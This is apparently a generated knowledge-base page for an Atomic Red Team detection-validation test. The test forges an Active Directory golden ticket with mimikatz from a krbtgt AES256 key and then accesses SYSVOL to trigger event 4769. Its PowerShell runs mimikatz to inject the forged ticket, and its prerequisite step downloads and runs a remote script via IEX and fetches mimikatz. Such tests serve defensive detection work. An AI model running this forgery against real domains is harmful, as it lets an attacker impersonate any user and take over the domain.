---
atomic_guid: "9726592a-dabc-4d4d-81cd-44070008b3af"
title: "Crafting Active Directory golden tickets with mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.001"
attack_technique_name: "Steal or Forge Kerberos Tickets: Golden Ticket"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "9726592a-dabc-4d4d-81cd-44070008b3af"
  - "Crafting Active Directory golden tickets with mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Crafting Active Directory golden tickets with mimikatz

Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.

## Metadata

- Atomic GUID: 9726592a-dabc-4d4d-81cd-44070008b3af
- Technique: T1558.001: Steal or Forge Kerberos Tickets: Golden Ticket
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1558.001/T1558.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.001]]

## Input Arguments

### account

- description: Account to impersonate
- type: string
- default: goldenticketfakeuser

### domain

- description: Targeted Active Directory domain FQDN
- type: string
- default: %userdnsdomain%

### domain_sid

- description: SID of the targeted domain, if you keep default it will automatically get the current domain SID
- type: string
- default: S-1-5-21-DEFAULT

### krbtgt_aes256_key

- description: Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)
- type: string
- default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9

### mimikatz_path

- description: Mimikatz windows executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

## Dependencies

Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Prerequisite Check

```text
$mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = "#{domain_sid}"
If ($domain_sid -Match "DEFAULT") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate "runas /netonly" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
@"
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"

  echo.
  echo Requesting SYSVOL:
  dir \\#{domain}\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
"@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.yaml)
